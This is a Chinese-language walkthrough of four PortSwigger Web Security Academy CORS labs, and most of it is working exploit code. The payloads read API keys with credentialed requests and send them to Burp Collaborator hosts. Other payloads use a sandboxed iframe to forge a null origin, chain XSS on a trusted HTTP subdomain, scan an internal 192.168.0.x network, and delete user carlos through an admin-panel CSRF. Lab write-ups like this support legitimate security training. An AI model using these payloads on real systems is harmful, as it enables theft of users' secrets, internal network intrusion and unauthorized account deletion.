[TOC]

#### 0. [Cross-origin resource sharing (CORS)](https://portswigger.net/web-security/cors)

#### 1. CORS vulnerability with basic origin reflection

```html
<script>
    fetch('/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```

可以看到这里的apikey是从`/accountDetails`请求到的，而且这里任何请求源都是可以的。

POC:

```html
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://ac791f261ef0458680a600fa00bb00c5.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
	location = 'https://d5j3pam6uqnw0w6b9kg06xf5vw1mpb.burpcollaborator.net/?key=' + this.responseText;
};
</script>
```

这里去请求，然后将得到的key发送给burp collaborator。

#### 2. CORS vulnerability with trusted null origin

> The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:
>
> - Cross-site redirects.
> - Requests from serialized data.
> - Request using the `file:` protocol.
> - Sandboxed cross-origin requests.
>
>  An attacker can use various tricks to generate a cross-domain request containing the value `null` in the Origin header. This will satisfy the whitelist, leading to cross-domain access. For example, this can be done using a sandboxed `iframe` cross-origin request of the form:
>
> ```html
> <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
> var req = new XMLHttpRequest();
> req.onload = reqListener;
> req.open('get','vulnerable-website.com/sensitive-victim-data',true);
> req.withCredentials = true;
> req.send();
> 
> function reqListener() {
> location='malicious-website.com/log?key='+this.responseText;
> };
> </script>"></iframe>
> ```

题目这里也是信任`Origin: null`。我们用上述的沙盒来使得origin为空。

这道题也是从`/accountDetails`处获取的key。

POC：

```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://aca51f131e41e79c801a033f00ad0082.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
location='https://b6inmflbyq9n6ibgqp4fa4s8wz2pqe.burpcollaborator.net?key='+this.responseText;
};
</script>"></iframe>
```

#### 3. CORS vulnerability with trusted insecure protocols

> an attacker who is in a position to intercept a victim user's traffic can exploit the CORS configuration to compromise the victim's interaction with the application. This attack involves the following steps:
>
> - The victim user makes any plain HTTP request.
> - The attacker injects a redirection to: `http://trusted-subdomain.vulnerable-website.com`
> - The victim's browser follows the redirect.
> - The attacker intercepts the plain HTTP request, and returns a spoofed response containing a CORS request to: `https://vulnerable-website.com`
> - The victim's browser makes the CORS request, including the origin: `http://trusted-subdomain.vulnerable-website.com`
> - The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
> - The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.

按照这个教程来看的话，解题顺序就是下面这样

* 找到一个包含了XSS漏洞的信任网站。

    找了半天只发现了这个网站：`http://stock.ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/?productId=1&storeId=1`

    其他网站也没有发现XSS漏洞，反而这个网站发现了XSS漏洞。

    `http://stock.ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/?productId=1<script>alert(1)</script>&storeId=1`

* 构造漏洞语句。

    ```html
    <script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();
    
    function reqListener() {
    location='https://nd45l3xfse55vo9bqxkngzcwknqde2.burpcollaborator.net?key='+this.responseText;
    };
    </script>
    ```

    最好要删除所有的回车以及进行url编码。

    ```html
    <script>var req = new XMLHttpRequest();req.onload = reqListener;req.open('get','https://ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/accountDetails',true);req.withCredentials = true;req.send();function reqListener() {location='https://nd45l3xfse55vo9bqxkngzcwknqde2.burpcollaborator.net?key='+this.responseText;};</script>
    
    %3c%73%63%72%69%70%74%3e%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%61%63%32%66%31%66%38%63%31%65%31%35%34%36%63%31%38%30%64%62%35%35%34%61%30%30%63%34%30%30%61%33%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%72%65%71%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%6e%64%34%35%6c%33%78%66%73%65%35%35%76%6f%39%62%71%78%6b%6e%67%7a%63%77%6b%6e%71%64%65%32%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3b%3c%2f%73%63%72%69%70%74%3e
    ```

* 构建漏洞网页，并且构造直接访问漏洞页面的script。

    ```html
    <script> document.location = "http://stock.ac2f1f8c1e1546c180db554a00c400a3.web-security-academy.net/?productId=1%3c%73%63%72%69%70%74%3e%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%61%63%32%66%31%66%38%63%31%65%31%35%34%36%63%31%38%30%64%62%35%35%34%61%30%30%63%34%30%30%61%33%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%72%65%71%2e%73%65%6e%64%28%29%3b%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%6c%6f%63%61%74%69%6f%6e%3d%27%68%74%74%70%73%3a%2f%2f%6e%64%34%35%6c%33%78%66%73%65%35%35%76%6f%39%62%71%78%6b%6e%67%7a%63%77%6b%6e%71%64%65%32%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%6b%65%79%3d%27%2b%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%3b%7d%3b%3c%2f%73%63%72%69%70%74%3e&storeId=1";</script>
    ```

* 接下来就是复制到exploit server里面，然后发送出去。

#### 4. CORS vulnerability with internal network pivot attack

这道题目对所有内网都不设防，使用CORS删除Carlos就可以通过。

* 第一步，先扫描主机。

    ```html
    <script>
        let base_url = "http://192.168.0.";
        let port = ":8080";
        let base_col_url = "http://vhg7pkizeo6n7rnr7j735jmjlar2fr.burpcollaborator.net/";
        function request(url) {
            var xhr = new XMLHttpRequest();
        	xhr.open("GET", url, true);
        	xhr.send();
        	xhr.onreadystatechange = function () {
                if (xhr.readyState == 4 && xhr.status == 200) {
                    send_col("url=" + encodeURIComponent(url) + "&data=" + encodeURIComponent(xhr.responceText) + "&status=" + xhr.status);
                }
            }
        }
        function send_col(text) {
            var collaborator = new XMLHttpRequest();
            var col_url = base_col_url + "?" + text;
            collaborator.open("GET", col_url, true);
            collaborator.send();
        }
        for (var i = 0; i <= 255; i++) {
            request(base_url + i + port);
        }
    </script>
    ```

    这一次我测出来是`192.168.0.90:8080`。

* 找到XSS的注入点，并利用起来。

    * 注入点在login的username的位置：

        `https://ac841fae1e6514fe809549e90082000b.web-security-academy.net/login?username=%22%3E%3Cimg%20src=%22as%22%20onerror=%22alert(1)%22%3E`

    * 这里看了官方的payload才知道要进入`/admin`去删除账号。

        先去看看`/admin`里面有什么东西，发现不给进入。

        这里先构造进入`/admin`的代码。

        ```html
        <iframe src="/admin" onload="var xhr = new XMLHttpRequest();
        		var url = 'http://3rveoigls8p7z5dkz2zpa7p49vfl3a.burpcollaborator.net?' + encodeURIComponent(this.contentWindow.document.body.innerHTML);
            	xhr.open('GET', url, true);
            	xhr.send();">
        </iframe>
        ```

        然后进行url-encode，并构造进入代码。

        这里如果要进行测试，因为`https`和`http`必须要统一，所以上面的burp collaborator的地址得用`https`，不然发不出去。

        ```html
        <script>
        location = 'http://192.168.0.90:8080/login?username=">%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%2f%61%64%6d%69%6e%22%20%6f%6e%6c%6f%61%64%3d%22%76%61%72%20%78%68%72%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%09%09%76%61%72%20%75%72%6c%20%3d%20%27%68%74%74%70%3a%2f%2f%33%72%76%65%6f%69%67%6c%73%38%70%37%7a%35%64%6b%7a%32%7a%70%61%37%70%34%39%76%66%6c%33%61%2e%62%75%72%70%63%6f%6c%6c%61%62%6f%72%61%74%6f%72%2e%6e%65%74%3f%27%20%2b%20%65%6e%63%6f%64%65%55%52%49%43%6f%6d%70%6f%6e%65%6e%74%28%74%68%69%73%2e%63%6f%6e%74%65%6e%74%57%69%6e%64%6f%77%2e%64%6f%63%75%6d%65%6e%74%2e%62%6f%64%79%2e%69%6e%6e%65%72%48%54%4d%4c%29%3b%0a%20%20%20%20%09%78%68%72%2e%6f%70%65%6e%28%27%47%45%54%27%2c%20%75%72%6c%2c%20%74%72%75%65%29%3b%0a%20%20%20%20%09%78%68%72%2e%73%65%6e%64%28%29%3b%22%3e%0a%3c%2f%69%66%72%61%6d%65%3e'
        </script>
        ```

        得到了网页：

        ```html
        <script src="/resources/js/labHeader.js"></script>
        HSCFiSYNxuGCXRwM3xvJQujhrlViZHGxu
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href="/">Home</a><p>|</p>
                            <a href="/admin">Admin panel</a><p>|</p>
                            <a href="/my-account?id=administrator">My account</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <form style="margin-top: 1em" class="login-form" action="/admin/delete" method="POST">
                        <input required="" type="hidden" name="csrf" value="sLg91YeOF230NqHQ0G1Jp2Pe2yT6juAO">
                        <label>Username</label>
                        <input required="" type="text" name="username">
                        <button class="button" type="submit">Delete user</button>
                    </form>
                </div>
            </section>
        </div>
        ```

* 接下来就是构造删除账号的XSS代码了。这里用CSRF来搞定。

    ```html
    <iframe src="/admin" onload="var x = this.contentWindow.document.forms[0]; x.username.value='carlos'; x.submit();">
    </iframe>
    ```

    这里的Carlos不是题目上说的那样，而是全小写。

    ```html
    <script>
    location = 'http://192.168.0.90:8080/login?username=">%3c%69%66%72%61%6d%65%20%73%72%63%3d%22%2f%61%64%6d%69%6e%22%20%6f%6e%6c%6f%61%64%3d%22%76%61%72%20%78%20%3d%20%74%68%69%73%2e%63%6f%6e%74%65%6e%74%57%69%6e%64%6f%77%2e%64%6f%63%75%6d%65%6e%74%2e%66%6f%72%6d%73%5b%30%5d%3b%20%78%2e%75%73%65%72%6e%61%6d%65%2e%76%61%6c%75%65%3d%27%63%61%72%6c%6f%73%27%3b%20%78%2e%73%75%62%6d%69%74%28%29%3b%22%3e%0a%3c%2f%69%66%72%61%6d%65%3e'
    </script>
    ```

    我一开始用的：

    ```html
    <iframe src="/admin?username=carlos" onload="this.contentWindow.document.forms[0].submit();">
    </iframe>
    ```

    可能这样没法把carlos赋值给username吧。

